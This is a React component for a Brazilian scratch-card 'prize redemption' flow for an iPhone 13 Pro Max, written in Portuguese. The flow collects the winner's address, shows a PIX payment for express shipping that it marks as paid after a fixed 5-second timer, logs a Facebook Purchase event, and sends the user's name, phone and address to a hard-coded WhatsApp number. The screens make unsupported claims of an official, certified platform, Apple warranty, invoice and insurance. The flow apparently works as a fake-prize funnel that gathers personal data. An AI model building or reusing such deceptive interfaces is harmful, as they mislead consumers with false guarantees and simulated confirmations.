import React, { useState, useEffect, useRef } from 'react';
import { User } from '../types';
import {
  MapPin,
  Truck,
  CreditCard,
  CheckCircle,
  Clock,
  Package,
  Copy,
  QrCode,
  MessageCircle,
  Shield,
  Award,
  Zap,
  Star,
  AlertTriangle,
  TrendingUp,
  Gift
} from 'lucide-react';
import { useFictionalPix } from '../hooks/useFictionalPix';
import { QRCodeGenerator } from './QRCodeGenerator';

interface PrizeRedemptionFlowProps {
  user: User;
  onClose: () => void;
  trackFacebookEvent?: (eventName: string, parameters?: any) => void;
}

interface AddressData {
  cep: string;
  street: string;
  number: string;
  complement: string;
  neighborhood: string;
  city: string;
  state: string;
}

interface ShippingOption {
  id: string;
  name: string;
  price: number;
  days: string;
  description: string;
  icon: string;
  isFree?: boolean;
  badge?: string;
}

const shippingOptions: ShippingOption[] = [
  {
    id: 'free',
    name: '📦 Entrega Gratuita pelos Correios',
    price: 0,
    days: '7-12 dias úteis',
    description: 'Frete GRÁTIS com rastreamento completo via WhatsApp',
    icon: '🎁',
    isFree: true,
    badge: 'RECOMENDADO'
  },
  {
    id: 'express',
    name: '⚡ Entrega Expressa',
    price: 49.90,
    days: '2-3 dias úteis',
    description: 'Receba mais rápido (Opcional)',
    icon: '⚡',
    badge: 'OPCIONAL'
  }
];

export const PrizeRedemptionFlow: React.FC<PrizeRedemptionFlowProps> = ({ user, onClose, trackFacebookEvent }) => {
  const [currentStep, setCurrentStep] = useState(1);
  const [addressData, setAddressData] = useState<AddressData>({
    cep: '',
    street: '',
    number: '',
    complement: '',
    neighborhood: '',
    city: '',
    state: ''
  });
  const [selectedShipping, setSelectedShipping] = useState<ShippingOption | null>(null);
  const [isLoadingCep, setIsLoadingCep] = useState(false);
  const [isCalculatingShipping, setIsCalculatingShipping] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Estados do PIX para frete
  const { loading: pixLoading, error: pixError, pixData, createPix, reset: resetPix } = useFictionalPix();
  const [copied, setCopied] = useState(false);
  const [isCheckingPayment, setIsCheckingPayment] = useState(false);

  const containerRef = useRef<HTMLDivElement>(null);

  // Scroll automático para o topo em cada mudança de step
  useEffect(() => {
    if (containerRef.current) {
      containerRef.current.scrollTo({
        top: 0,
        behavior: 'smooth'
      });
    }
  }, [currentStep]);

  // Buscar CEP automaticamente
  const fetchCepData = async (cep: string) => {
    if (cep.length !== 9) return;

    setIsLoadingCep(true);
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cep.replace('-', '')}/json/`);
      const data = await response.json();

      if (!data.erro) {
        setAddressData(prev => ({
          ...prev,
          street: data.logradouro || '',
          neighborhood: data.bairro || '',
          city: data.localidade || '',
          state: data.uf || ''
        }));
      }
    } catch (error) {
      console.error('Erro ao buscar CEP:', error);
    } finally {
      setIsLoadingCep(false);
    }
  };

  // Simulação de pagamento automático após 5 segundos
  useEffect(() => {
    if (!pixData || currentStep !== 3) return;

    setIsCheckingPayment(true);

    // Simular pagamento após 5 segundos
    const paymentTimeout = setTimeout(() => {
      // Track Purchase quando frete for pago
      if (trackFacebookEvent && selectedShipping && selectedShipping.price > 0) {
        const eventId = `purchase_shipping_${pixData.transactionId}`;
        trackFacebookEvent('Purchase', {
          event_id: eventId,
          content_type: 'product',
          content_name: `iPhone 13 Pro Max - Frete ${selectedShipping.name}`,
          content_ids: ['iphone13promax_shipping'],
          content_category: 'Shipping',
          value: selectedShipping.price,
          currency: 'BRL',
          num_items: 1
        });
      }

      localStorage.setItem('iphone_redeemed', 'true');
      setCurrentStep(4);
      setIsCheckingPayment(false);
    }, 5000);

    return () => {
      clearTimeout(paymentTimeout);
    };
  }, [pixData, currentStep, selectedShipping, trackFacebookEvent]);

  // Scroll automático para o código PIX quando gerado
  useEffect(() => {
    if (pixData && currentStep === 3) {
      const timer = setTimeout(() => {
        const pixCodeSection = document.getElementById('pix-code-section');
        if (pixCodeSection) {
          pixCodeSection.scrollIntoView({
            behavior: 'smooth',
            block: 'center',
            inline: 'nearest'
          });
        }
      }, 1000);

      return () => clearTimeout(timer);
    }
  }, [pixData, currentStep]);


  const formatCep = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.replace(/(\d{5})(\d{3})/, '$1-$2');
  };

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {};

    if (!addressData.cep) newErrors.cep = 'CEP é obrigatório';
    if (!addressData.street) newErrors.street = 'Rua é obrigatória';
    if (!addressData.number) newErrors.number = 'Número é obrigatório';
    if (!addressData.neighborhood) newErrors.neighborhood = 'Bairro é obrigatório';
    if (!addressData.city) newErrors.city = 'Cidade é obrigatória';
    if (!addressData.state) newErrors.state = 'Estado é obrigatório';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleStep1Submit = () => {
    if (validateStep1()) {
      setIsCalculatingShipping(true);

      // Simular cálculo de frete
      setTimeout(() => {
        setIsCalculatingShipping(false);
        setCurrentStep(2);
      }, 2500);
    }
  };

  const handleShippingSelect = (option: ShippingOption) => {
    setSelectedShipping(option);

    if (option.isFree) {
      // Entrega gratuita: pula direto para o final
      localStorage.setItem('iphone_redeemed', 'true');
      setCurrentStep(4);
    } else {
      // Entrega expressa: gera PIX
      setCurrentStep(3);
      generateShippingPix(option);
    }
  };

  const generateShippingPix = async (shipping: ShippingOption) => {
    try {
      await createPix(shipping.price);
    } catch (error) {
      console.error('Erro ao gerar PIX do frete:', error);
    }
  };

  const copyPixCode = async () => {
    if (!pixData?.qrcode) return;

    try {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Erro ao copiar:', err);
    }
  };

  const handleFinalClose = () => {
    localStorage.setItem('iphone_redeemed', 'true');
    localStorage.removeItem('iphone_winning_shown'); // Limpar flag para permitir nova vitória

    // Redirecionar para WhatsApp
    const message = encodeURIComponent(`🎉 Olá! Resgatei meu iPhone 13 Pro Max na raspadinha!

📱 *Prêmio:* iPhone 13 Pro Max 128GB Prata (R$ 4.899)
🚚 *Frete:* ${selectedShipping?.name}

📍 *Endereço:*
${addressData.street}, ${addressData.number}${addressData.complement ? `, ${addressData.complement}` : ''}
${addressData.neighborhood} - ${addressData.city}/${addressData.state}
CEP: ${addressData.cep}

👤 *Ganhador:* ${user.name} | ${user.phone}

Preciso do código de rastreamento! 📦`);

    window.open(`https://wa.me/5563981480126?text=${message}`, '_blank');
    onClose();
  };

  // Header sempre visível
  const HeaderWithProgress = () => (
    <div className="sticky top-0 z-50 glass-dark backdrop-blur-xl border-b border-white/10">
      <div className="p-4">
        {/* Info do prêmio */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-br from-gray-400 to-gray-600 rounded-2xl flex items-center justify-center shadow-modern">
              <img
                src="/iphone_13_PNG31.png"
                alt="iPhone 13 Pro Max"
                className="w-8 h-8 object-contain"
              />
            </div>
            <div>
              <h1 className="text-white font-bold text-lg">iPhone 13 Pro Max</h1>
              <p className="text-gray-300 text-sm">128GB Prata - R$ 4.899,00</p>
            </div>
          </div>
          <div className="text-center">
            <div className="bg-gradient-to-r from-emerald-500 to-teal-600 text-white px-3 py-1 rounded-full text-xs font-bold mb-1">
              PASSO {currentStep}/4
            </div>
            <div className="w-16 bg-gray-700 rounded-full h-1">
              <div
                className="bg-gradient-to-r from-emerald-500 to-teal-600 h-1 rounded-full transition-all duration-500"
                style={{ width: `${(currentStep / 4) * 100}%` }}
              ></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  // Step 1: Endereço
  if (currentStep === 1) {
    return (
      <div className="fixed inset-0 bg-primary z-50 flex flex-col">
        <HeaderWithProgress />

        <div ref={containerRef} className="flex-1 overflow-y-auto touch-pan-y overscroll-contain">
          <div className="p-4">
            <div className="max-w-md mx-auto">

              {/* Garantias de Segurança - Destaque Máximo */}
              <div className="bg-gradient-to-br from-emerald-500 to-teal-600 rounded-2xl p-5 mb-6 border-2 border-emerald-400 shadow-2xl">
                <div className="flex items-center gap-3 mb-4">
                  <div className="bg-white/20 p-2 rounded-full">
                    <Shield className="w-7 h-7 text-white" />
                  </div>
                  <div>
                    <h3 className="text-white font-bold text-lg">🏆 Entrega 100% Garantida</h3>
                    <p className="text-emerald-50 text-sm font-medium">Plataforma oficial e regularizada</p>
                  </div>
                </div>
                <div className="bg-white/10 rounded-xl p-4 backdrop-blur-sm">
                  <div className="grid grid-cols-3 gap-3 text-sm">
                    <div className="text-center">
                      <div className="bg-white/20 p-2 rounded-lg mb-2">
                        <Award className="w-5 h-5 mx-auto text-white" />
                      </div>
                      <span className="text-white font-bold">Certificada</span>
                    </div>
                    <div className="text-center">
                      <div className="bg-white/20 p-2 rounded-lg mb-2">
                        <Package className="w-5 h-5 mx-auto text-white" />
                      </div>
                      <span className="text-white font-bold">Rastreio</span>
                    </div>
                    <div className="text-center">
                      <div className="bg-white/20 p-2 rounded-lg mb-2">
                        <Star className="w-5 h-5 mx-auto text-white" />
                      </div>
                      <span className="text-white font-bold">Original</span>
                    </div>
                  </div>
                  <div className="mt-4 pt-4 border-t border-white/20">
                    <p className="text-white text-xs text-center font-medium">
                      ✓ iPhone lacrado de fábrica • ✓ Garantia Apple oficial • ✓ Nota Fiscal incluída
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-white rounded-3xl shadow-2xl p-6">
                <div className="text-center mb-6">
                  <div className="w-16 h-16 bg-accent rounded-full flex items-center justify-center mx-auto mb-3">
                    <MapPin className="w-6 h-6 text-white" />
                  </div>
                  <h2 className="text-xl font-bold text-gray-800 mb-2">Endereço de Entrega</h2>
                  <p className="text-gray-600">Informe onde deseja receber seu iPhone</p>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-700 font-bold mb-2 text-sm">CEP</label>
                    <input
                      type="text"
                      value={addressData.cep}
                      onChange={(e) => {
                        const formatted = formatCep(e.target.value);
                        setAddressData({...addressData, cep: formatted});
                        if (formatted.length === 9) {
                          fetchCepData(formatted);
                        }
                      }}
                      className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-colors text-gray-800 ${
                        errors.cep ? 'border-red-400' : 'border-gray-200 focus:border-indigo-500'
                      }`}
                      placeholder="00000-000"
                      maxLength={9}
                    />
                    {isLoadingCep && (
                      <div className="flex items-center gap-2 mt-2">
                        <div className="w-4 h-4 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                        <p className="text-blue-500 text-xs">Buscando endereço...</p>
                      </div>
                    )}
                    {errors.cep && <p className="text-red-500 text-xs mt-1">{errors.cep}</p>}
                  </div>

                  <div>
                    <label className="block text-gray-700 font-bold mb-2 text-sm">Rua</label>
                    <input
                      type="text"
                      value={addressData.street}
                      onChange={(e) => setAddressData({...addressData, street: e.target.value})}
                      className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-colors text-gray-800 ${
                        errors.street ? 'border-red-400' : 'border-gray-200 focus:border-indigo-500'
                      }`}
                      placeholder="Nome da rua"
                    />
                    {errors.street && <p className="text-red-500 text-xs mt-1">{errors.street}</p>}
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="block text-gray-700 font-bold mb-2 text-sm">Número</label>
                      <input
                        type="text"
                        value={addressData.number}
                        onChange={(e) => setAddressData({...addressData, number: e.target.value})}
                        className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-colors text-gray-800 ${
                          errors.number ? 'border-red-400' : 'border-gray-200 focus:border-indigo-500'
                        }`}
                        placeholder="123"
                      />
                      {errors.number && <p className="text-red-500 text-xs mt-1">{errors.number}</p>}
                    </div>

                    <div>
                      <label className="block text-gray-700 font-bold mb-2 text-sm">Complemento</label>
                      <input
                        type="text"
                        value={addressData.complement}
                        onChange={(e) => setAddressData({...addressData, complement: e.target.value})}
                        className="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:outline-none focus:border-indigo-500 transition-colors text-gray-800"
                        placeholder="Apto 101"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-gray-700 font-bold mb-2 text-sm">Bairro</label>
                    <input
                      type="text"
                      value={addressData.neighborhood}
                      onChange={(e) => setAddressData({...addressData, neighborhood: e.target.value})}
                      className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-colors text-gray-800 ${
                        errors.neighborhood ? 'border-red-400' : 'border-gray-200 focus:border-indigo-500'
                      }`}
                      placeholder="Nome do bairro"
                    />
                    {errors.neighborhood && <p className="text-red-500 text-xs mt-1">{errors.neighborhood}</p>}
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="block text-gray-700 font-bold mb-2 text-sm">Cidade</label>
                      <input
                        type="text"
                        value={addressData.city}
                        onChange={(e) => setAddressData({...addressData, city: e.target.value})}
                        className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-colors text-gray-800 ${
                          errors.city ? 'border-red-400' : 'border-gray-200 focus:border-indigo-500'
                        }`}
                        placeholder="Cidade"
                      />
                      {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
                    </div>

                    <div>
                      <label className="block text-gray-700 font-bold mb-2 text-sm">Estado</label>
                      <input
                        type="text"
                        value={addressData.state}
                        onChange={(e) => setAddressData({...addressData, state: e.target.value.toUpperCase()})}
                        className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-colors text-gray-800 ${
                          errors.state ? 'border-red-400' : 'border-gray-200 focus:border-indigo-500'
                        }`}
                        placeholder="SP"
                        maxLength={2}
                      />
                      {errors.state && <p className="text-red-500 text-xs mt-1">{errors.state}</p>}
                    </div>
                  </div>

                  <button
                    onClick={handleStep1Submit}
                    disabled={isCalculatingShipping}
                    className="w-full bg-accent text-white font-bold py-4 rounded-xl hover:bg-accent-hover transition-all active:scale-95 disabled:opacity-50"
                  >
                    {isCalculatingShipping ? (
                      <div className="flex items-center justify-center gap-2">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Calculando frete...
                      </div>
                    ) : (
                      'Calcular Frete'
                    )}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Step 2: Calculando frete / Escolha do Frete
  if (currentStep === 2) {
    if (isCalculatingShipping) {
      return (
        <div className="fixed inset-0 bg-primary z-50 flex flex-col">
          <HeaderWithProgress />

          <div className="flex-1 flex items-center justify-center p-4">
            <div className="max-w-md mx-auto text-center">
              <div className="bg-white rounded-3xl shadow-2xl p-8">
                <div className="w-20 h-20 bg-accent rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
                  <Truck className="w-8 h-8 text-white" />
                </div>

                <h2 className="text-2xl font-bold text-gray-800 mb-4">Calculando Frete</h2>
                <p className="text-gray-600 mb-6">Buscando as melhores opções de entrega para sua região...</p>

                <div className="space-y-3">
                  <div className="flex items-center gap-3 text-sm text-gray-600">
                    <div className="w-5 h-5 border-2 border-accent border-t-transparent rounded-full animate-spin"></div>
                    <span>Consultando transportadoras...</span>
                  </div>
                  <div className="flex items-center gap-3 text-sm text-gray-600">
                    <div className="w-5 h-5 border-2 border-accent border-t-transparent rounded-full animate-spin" style={{ animationDelay: '0.5s' }}></div>
                    <span>Calculando prazos de entrega...</span>
                  </div>
                  <div className="flex items-center gap-3 text-sm text-gray-600">
                    <div className="w-5 h-5 border-2 border-accent border-t-transparent rounded-full animate-spin" style={{ animationDelay: '1s' }}></div>
                    <span>Verificando disponibilidade...</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      );
    }

    return (
      <div className="fixed inset-0 bg-primary z-50 flex flex-col">
        <HeaderWithProgress />

        <div ref={containerRef} className="flex-1 overflow-y-auto touch-pan-y overscroll-contain">
          <div className="p-4">
            <div className="max-w-md mx-auto">
              <div className="bg-white rounded-3xl shadow-2xl p-6">
                <div className="text-center mb-6">
                  <div className="w-16 h-16 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-full flex items-center justify-center mx-auto mb-3 shadow-lg">
                    <Truck className="w-7 h-7 text-white" />
                  </div>
                  <h2 className="text-2xl font-bold text-gray-800 mb-2">Escolha sua Entrega</h2>
                  <p className="text-gray-600 font-medium">Todas as opções incluem rastreamento e seguro</p>
                </div>

                <div className="space-y-4">
                  {shippingOptions.map((option) => {
                    const isRecommended = option.isFree;
                    const isDisabled = !option.isFree; // Desabilitar opção expressa

                    return (
                    <button
                      key={option.id}
                      onClick={() => !isDisabled && handleShippingSelect(option)}
                      disabled={isDisabled}
                      className={`w-full p-5 border-3 rounded-2xl transition-all text-left relative overflow-hidden shadow-lg ${
                        isDisabled ? 'opacity-40 cursor-not-allowed' : 'active:scale-95 group hover:shadow-xl'
                      } ${
                        isRecommended
                          ? 'border-emerald-400 bg-gradient-to-br from-emerald-50 to-teal-50 hover:border-emerald-500'
                          : 'border-gray-300 bg-gradient-to-br from-gray-50 to-gray-100'
                      }`}
                    >
                      {option.badge && (
                        <div className={`absolute top-3 right-3 px-3 py-1 rounded-full text-xs font-bold shadow-md ${
                          isRecommended ? 'bg-emerald-500 text-white' : 'bg-gray-400 text-white'
                        }`}>
                          {option.badge}
                        </div>
                      )}

                      {isDisabled && (
                        <div className="absolute top-3 left-3 bg-red-500 text-white px-2 py-1 rounded-full text-xs font-bold">
                          INDISPONÍVEL
                        </div>
                      )}

                      <div className="flex items-start gap-4 mb-3">
                        <div className={`text-4xl p-3 rounded-xl ${
                          isRecommended ? 'bg-emerald-100' : 'bg-gray-200'
                        }`}>
                          {option.icon}
                        </div>
                        <div className="flex-1">
                          <h3 className={`font-bold text-lg mb-1 ${
                            isRecommended ? 'text-emerald-800' : 'text-gray-700'
                          }`}>
                            {option.name}
                          </h3>
                          <div className="flex items-center gap-2 text-sm text-gray-600 mb-2">
                            <Clock className="w-4 h-4" />
                            <span className="font-medium">{option.days}</span>
                          </div>
                          <p className="text-sm text-gray-700 font-medium leading-relaxed">{option.description}</p>
                        </div>
                      </div>

                      <div className={`flex items-center justify-between pt-3 border-t-2 ${
                        isRecommended ? 'border-emerald-200' : 'border-gray-200'
                      }`}>
                        <div className="flex items-center gap-2">
                          <Shield className={`w-4 h-4 ${
                            isRecommended ? 'text-emerald-600' : 'text-gray-600'
                          }`} />
                          <span className="text-xs text-gray-600 font-medium">Entrega garantida</span>
                        </div>
                        <div className={`text-2xl font-bold ${
                          isRecommended ? 'text-emerald-600' : 'text-gray-600'
                        }`}>
                          {option.isFree ? 'GRÁTIS' : `R$ ${option.price.toFixed(2).replace('.', ',')}`}
                        </div>
                      </div>

                      {isRecommended && (
                        <div className="mt-3 bg-gradient-to-r from-emerald-100 to-teal-100 rounded-lg p-3 border border-emerald-300">
                          <div className="flex items-center justify-center gap-2">
                            <MessageCircle className="w-4 h-4 text-emerald-700" />
                            <span className="text-xs font-bold text-emerald-800">Acompanhe a entrega pelo WhatsApp!</span>
                          </div>
                        </div>
                      )}
                    </button>
                  );})}
                </div>

                {/* Garantias - Reforço de Credibilidade MÁXIMA */}
                <div className="mt-6 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-2xl p-5 shadow-2xl border-2 border-emerald-400">
                  <div className="flex items-start gap-3 mb-3">
                    <div className="bg-white/20 p-2 rounded-full">
                      <Shield className="w-6 h-6 text-white" />
                    </div>
                    <div>
                      <h4 className="font-bold text-white text-lg mb-1">🛡️ Entrega 100% Garantida</h4>
                      <p className="text-emerald-50 text-sm">Compromisso oficial de entrega</p>
                    </div>
                  </div>
                  <div className="bg-white/10 rounded-xl p-4 backdrop-blur-sm">
                    <ul className="text-white text-sm space-y-2.5">
                      <li className="flex items-center gap-2">
                        <div className="w-5 h-5 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
                          <span className="text-xs">✓</span>
                        </div>
                        <span className="font-medium">iPhone original Apple lacrado com garantia oficial</span>
                      </li>
                      <li className="flex items-center gap-2">
                        <div className="w-5 h-5 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
                          <span className="text-xs">✓</span>
                        </div>
                        <span className="font-medium">Envio gratuito pelos Correios com código de rastreamento</span>
                      </li>
                      <li className="flex items-center gap-2">
                        <div className="w-5 h-5 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
                          <span className="text-xs">✓</span>
                        </div>
                        <span className="font-medium">Acompanhamento em tempo real via WhatsApp oficial</span>
                      </li>
                      <li className="flex items-center gap-2">
                        <div className="w-5 h-5 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
                          <span className="text-xs">✓</span>
                        </div>
                        <span className="font-medium">Seguro total contra roubo, extravio e danos</span>
                      </li>
                      <li className="flex items-center gap-2">
                        <div className="w-5 h-5 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
                          <span className="text-xs">✓</span>
                        </div>
                        <span className="font-medium">Nota Fiscal eletrônica e certificado de autenticidade</span>
                      </li>
                    </ul>
                    <div className="mt-4 pt-4 border-t border-white/20">
                      <p className="text-white text-xs text-center font-bold">
                        📦 Você receberá o código de rastreamento via WhatsApp em até 24h após a postagem
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Step 3: Pagamento do Frete
  if (currentStep === 3 && selectedShipping) {
    return (
      <div className="fixed inset-0 bg-primary z-50 flex flex-col">
        <HeaderWithProgress />

        <div ref={containerRef} className="flex-1 overflow-y-auto touch-pan-y overscroll-contain">
          <div className="p-4">
            <div className="max-w-md mx-auto">
              <div className="bg-white rounded-3xl shadow-2xl p-6">
                {!pixData ? (
                  <div className="text-center">
                    <div className="w-16 h-16 bg-accent rounded-full flex items-center justify-center mx-auto mb-4 animate-spin">
                      <CreditCard className="w-6 h-6 text-white" />
                    </div>
                    <h2 className="text-xl font-bold text-gray-800 mb-2">Gerando PIX...</h2>
                    <p className="text-gray-600">Aguarde um momento</p>
                  </div>
                ) : (
                  <div className="space-y-6">
                    <div className="text-center">
                      <div className="w-16 h-16 bg-accent rounded-full flex items-center justify-center mx-auto mb-3">
                        <QrCode className="w-8 h-8 text-white" />
                      </div>
                      <h2 className="text-xl font-bold text-gray-800 mb-2">Pagamento do Frete</h2>
                      <div className="bg-accent text-white rounded-full px-4 py-2 inline-block font-bold">
                        R$ {selectedShipping.price.toFixed(2).replace('.', ',')}
                      </div>
                      <p className="text-gray-600 text-sm mt-2">{selectedShipping.name}</p>
                    </div>

                    <div className="bg-gradient-to-br from-gray-50 to-white rounded-xl p-4 text-center border border-gray-200">
                      <div className="bg-white rounded-lg p-4 shadow-lg inline-block border border-gray-100">
                        <QRCodeGenerator
                          value={pixData.qrcode}
                          size={160}
                          className="mx-auto"
                        />
                      </div>
                      <p className="text-sm text-gray-600 mt-3 font-medium">
                        📱 Escaneie com o app do seu banco
                      </p>
                    </div>

                    <div>
                      <label className="block text-gray-700 font-bold mb-2 text-sm">
                        💳 Código PIX (Copia e Cola):
                      </label>
                      <div id="pix-code-section" className="bg-gray-50 rounded-xl p-3 border border-gray-200">
                        <input
                          type="text"
                          value={pixData.qrcode}
                          readOnly
                          className="w-full px-3 py-3 bg-white border border-gray-200 rounded-lg text-xs font-mono mb-3 focus:outline-none text-gray-800"
                          onClick={(e) => (e.target as HTMLInputElement).select()}
                        />
                        <button
                          onClick={copyPixCode}
                          className={`w-full px-4 py-3 rounded-lg font-bold transition-all active:scale-95 ${
                            copied
                              ? 'bg-emerald-500 text-white'
                              : 'bg-indigo-500 text-white hover:bg-indigo-600'
                          }`}
                        >
                          {copied ? (
                            <div className="flex items-center justify-center gap-2">
                              <CheckCircle className="w-4 h-4" />
                              <span>Código Copiado!</span>
                            </div>
                          ) : (
                            <div className="flex items-center justify-center gap-2">
                              <Copy className="w-4 h-4" />
                              <span>Copiar Código PIX</span>
                            </div>
                          )}
                        </button>
                      </div>
                    </div>

                    <div className={`border-2 rounded-xl p-4 ${
                      isCheckingPayment ? 'bg-green-50 border-green-300' : 'bg-blue-50 border-blue-300'
                    }`}>
                      <div className="flex items-center justify-center gap-2">
                        {isCheckingPayment && (
                          <div className="w-5 h-5 border-2 border-green-600 border-t-transparent rounded-full animate-spin"></div>
                        )}
                        <p className={`text-sm text-center font-bold ${
                          isCheckingPayment ? 'text-green-700' : 'text-blue-700'
                        }`}>
                          {isCheckingPayment
                            ? '🔄 Verificando pagamento automaticamente...'
                            : '💡 Após pagar, receba seu iPhone mais rápido!'
                          }
                        </p>
                      </div>
                    </div>

                    {/* Garantia de envio */}
                    <div className="bg-gradient-to-br from-emerald-500 to-teal-600 border-2 border-emerald-400 rounded-xl p-4 shadow-lg">
                      <div className="flex items-center gap-3 mb-2">
                        <Shield className="w-5 h-5 text-white" />
                        <span className="text-white font-bold">Garantia de Envio Express</span>
                      </div>
                      <p className="text-emerald-50 text-xs leading-relaxed">
                        Seu iPhone será enviado em até 24h após confirmação do pagamento. Produto 100% original e lacrado.
                      </p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Step 4: Sucesso
  if (currentStep === 4) {
    return (
      <div className="fixed inset-0 bg-primary z-50 flex flex-col">
        <HeaderWithProgress />

        <div ref={containerRef} className="flex-1 overflow-y-auto touch-pan-y overscroll-contain">
          <div className="p-4 min-h-full flex items-center justify-center">
            <div className="max-w-md mx-auto w-full">
              <div className="bg-white rounded-3xl shadow-2xl p-6 text-center">
                <div className="w-20 h-20 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce shadow-xl">
                  <CheckCircle className="w-10 h-10 text-white" />
                </div>

                <h1 className="text-3xl font-bold text-gray-800 mb-2">🎉 Parabéns! 🎉</h1>
                <h2 className="text-xl font-bold text-emerald-600 mb-4">iPhone 13 Pro Max Resgatado!</h2>

                {/* Garantia de envio - Destaque */}
                <div className="bg-gradient-to-br from-emerald-500 to-teal-600 rounded-2xl p-5 mb-4 border-2 border-emerald-400 shadow-2xl">
                  <div className="flex items-center justify-center gap-2 mb-3">
                    <Shield className="w-6 h-6 text-white" />
                    <h3 className="text-lg font-bold text-white">🛡️ Garantia Total de Envio</h3>
                  </div>
                  <div className="bg-white/10 rounded-xl p-4 backdrop-blur-sm">
                    <p className="text-white text-sm font-medium leading-relaxed mb-3">
                      Seu iPhone 13 Pro Max 128GB está <span className="font-bold">100% garantido</span>.
                      Produto original Apple, lacrado de fábrica, com nota fiscal e garantia oficial.
                    </p>
                    <div className="flex items-center justify-center gap-2">
                      <Award className="w-5 h-5 text-emerald-200" />
                      <span className="text-emerald-50 text-xs font-bold">Certificado de Autenticidade Incluso</span>
                    </div>
                  </div>
                </div>

                <div className="bg-green-50 rounded-2xl p-4 mb-4 border-2 border-green-300">
                  <div className="text-4xl mb-3">📦</div>
                  <h3 className="text-lg font-bold text-green-800 mb-2">Produto em Preparação</h3>
                  <p className="text-green-700 text-sm font-medium mb-3">
                    Seu iPhone 13 Pro Max está sendo preparado com todo cuidado para envio!
                  </p>
                  <div className="bg-white rounded-xl p-3 border border-green-300">
                    <div className="grid grid-cols-2 gap-3 text-xs">
                      <div>
                        <span className="text-gray-600">Produto:</span>
                        <p className="font-bold text-gray-800 text-xs">iPhone 13 Pro Max 128GB</p>
                      </div>
                      <div>
                        <span className="text-gray-600">Frete:</span>
                        <p className="font-bold text-gray-800 text-xs">{selectedShipping?.name}</p>
                      </div>
                      <div>
                        <span className="text-gray-600">Prazo:</span>
                        <p className="font-bold text-gray-800 text-xs">{selectedShipping?.days}</p>
                      </div>
                      <div>
                        <span className="text-gray-600">Status:</span>
                        <p className="font-bold text-accent text-xs">✅ Confirmado</p>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="space-y-3 mb-4">
                  <div className="flex items-center gap-3 text-sm text-gray-600">
                    <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                      <CheckCircle className="w-3 h-3 text-white" />
                    </div>
                    <span className="text-xs">Pagamento do frete confirmado</span>
                  </div>
                  <div className="flex items-center gap-3 text-sm text-gray-600">
                    <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                      <CheckCircle className="w-3 h-3 text-white" />
                    </div>
                    <span className="text-xs">Endereço de entrega registrado</span>
                  </div>
                  <div className="flex items-center gap-3 text-sm text-gray-600">
                    <div className="w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center">
                      <Clock className="w-3 h-3 text-white" />
                    </div>
                    <span className="text-xs">Produto será enviado em até 24h</span>
                  </div>
                </div>

                <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-4 mb-4 shadow-md">
                  <div className="flex items-center gap-2 justify-center mb-3">
                    <MessageCircle className="w-5 h-5 text-blue-600" />
                    <span className="text-blue-800 font-bold">Acompanhar Entrega</span>
                  </div>
                  <p className="text-blue-700 text-sm font-medium mb-3">
                    Clique no botão abaixo para receber o código de rastreamento e acompanhar sua entrega via WhatsApp.
                  </p>
                  <div className="bg-white rounded-lg p-3 border-2 border-blue-300">
                    <div className="flex items-center justify-center gap-2 text-sm text-blue-600">
                      <Package className="w-4 h-4" />
                      <span className="font-bold">Rastreamento disponível em até 24h</span>
                    </div>
                  </div>
                </div>

                <button
                  onClick={handleFinalClose}
                  className="w-full bg-green-600 text-white font-bold py-4 rounded-xl hover:bg-green-700 transition-all active:scale-95 flex items-center justify-center gap-2 shadow-modern"
                  style={{ touchAction: 'manipulation' }}
                >
                  <MessageCircle className="w-5 h-5" />
                  <span>Acompanhar no WhatsApp</span>
                </button>

                <div className="mt-3 text-center">
                  <div className="inline-flex items-center gap-2 text-xs text-gray-500 bg-gray-50 px-3 py-2 rounded-full border border-gray-200">
                    <Shield className="w-3 h-3 text-green-500" />
                    <span>Entrega garantida e rastreada</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return null;
};
